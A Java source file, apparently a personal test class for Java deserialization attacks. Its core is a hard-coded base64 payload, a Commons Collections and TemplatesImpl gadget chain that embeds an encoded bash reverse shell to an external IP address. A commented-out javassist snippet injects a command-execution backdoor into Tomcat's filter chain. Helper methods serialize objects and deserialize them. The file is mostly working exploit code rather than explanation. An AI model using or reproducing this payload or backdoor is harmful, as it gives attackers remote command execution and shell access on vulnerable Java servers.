package Seri;

import com.caucho.hessian.io.AnnotationInvocationHandler;
import com.sun.org.apache.bcel.internal.util.ClassLoader;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.tools.attach.VirtualMachine;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.beanutils.PropertyUtils;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import com.sun.tools.attach.VirtualMachineDescriptor;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import javax.management.BadAttributeValueExpException;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.*;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.*;

import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.Repository;

import org.apache.tomcat.dbcp.dbcp2.*;
import org.hibernate.transform.Transformers;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.springframework.security.core.parameters.P;

public class Test {
    public static void main(String[] args) throws Exception {
        try{
//            ClassPool.getDefault().insertClassPath("/Users/y1shin/.m2/repository/org/apache/tomcat/embed/tomcat-embed-core/9.0.65/tomcat-embed-core-9.0.65.jar");
//            CtClass c2 = ClassPool.getDefault().getCtClass("org.apache.catalina.core.ApplicationFilterChain");
//            CtMethod method = c2.getDeclaredMethod("doFilter");
//            System.out.println(method.getName());
//
//            Runtime.getRuntime().exec("calc");
//            String body =
//
//                    "javax.servlet.http.HttpServletRequest request = $1\n;" +
//
//                            "String cmd=request.getParameter(\"cmd\");\n" +
//
//                            "if (cmd != null){\n" +
//
//                            "  java.lang.Runtime.getRuntime().exec(cmd);\n" +
//
//                            "  } else {java.lang.Runtime.getRuntime().exec(\"calc\");};";
//            method.insertBefore(body);
////            ctMethod.setBody(body);
//            c2.writeFile();
            String payload = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAABBnK/rq+AAAANABCAQBZb3JnL2FwYWNoZS9jb21tb21zL2JlYW51dGlscy9jb3lvdGUvc2VyL3N0ZC9SYXdTZXJpYWxpemVyMTZhZWQ5OTFmNzliNDI1M2IxNTdjM2Q5MzUyZWEzY2IHAAEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwADAQAEYmFzZQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA3NlcAEAA2NtZAEABjxpbml0PgEAAygpVgEAE2phdmEvbGFuZy9FeGNlcHRpb24HAAsMAAkACgoABAANAQAHb3MubmFtZQgADwEAEGphdmEvbGFuZy9TeXN0ZW0HABEBAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7DAATABQKABIAFQEAEGphdmEvbGFuZy9TdHJpbmcHABcBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7DAAZABoKABgAGwEAA3dpbggAHQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDAAfACAKABgAIQEAB2NtZC5leGUIACMMAAUABgkAAgAlAQACL2MIACcMAAcABgkAAgApAQAHL2Jpbi9zaAgAKwEAAi1jCAAtDAAIAAYJAAIALwEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgcAMQEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYMAAkAMwoAMgA0AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsMADYANwoAMgA4AQAQamF2YS9sYW5nL09iamVjdAcAOgEACDxjbGluaXQ+AQBVe2VjaG8sYzJnZ0xXa2dQaVlnTDJSbGRpOTBZM0F2TkRjdU1UQTVMakkzTGpJd01TODVNRGs1SURBK0pqRT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfQgAPQoAAgANAQAEQ29kZQEADVN0YWNrTWFwVGFibGUAIQACAAQAAAADAAkABQAGAAAACQAHAAYAAAAJAAgABgAAAAIAAQAJAAoAAQBAAAAAhAAEAAIAAABTKrcADhIQuAAWtgAcEh62ACKZABASJLMAJhIoswAqpwANEiyzACYSLrMAKga9ABhZA7IAJlNZBLIAKlNZBbIAMFNMuwAyWSu3ADW2ADlXpwAETLEAAQAEAE4AUQAMAAEAQQAAABcABP8AIQABBwACAAAJZQcADPwAAAcAOwAIADwACgABAEAAAAAaAAIAAAAAAA4SPrMAMLsAAlm3AD9XsQAAAAAAAHB0ACQ1ODRkOGIzYi02NDVjLTQzZDEtOWE2Yi0yMGI5NzQwYWMxMjVwdwEAeHNyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnZva2VyVHJhbnNmb3JtZXKH6P9re3zOOAIAA1sABWlBcmdzdAATW0xqYXZhL2xhbmcvT2JqZWN0O0wAC2lNZXRob2ROYW1lcQB+AAlbAAtpUGFyYW1UeXBlc3EAfgAIeHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAAdAATZ2V0T3V0cHV0UHJvcGVydGllc3VyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHh4";
            Utils.unserializeFromBase64(payload);

        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    public static void serialize(Object object ,String filename) throws IOException {
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(object);
        oos.close();

        FileOutputStream fos = new FileOutputStream(filename);
        barr.writeTo(fos);
        fos.close();

        System.out.println(barr);
    }
    public static void unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        ois.readObject();
        ois.close();
    }
}
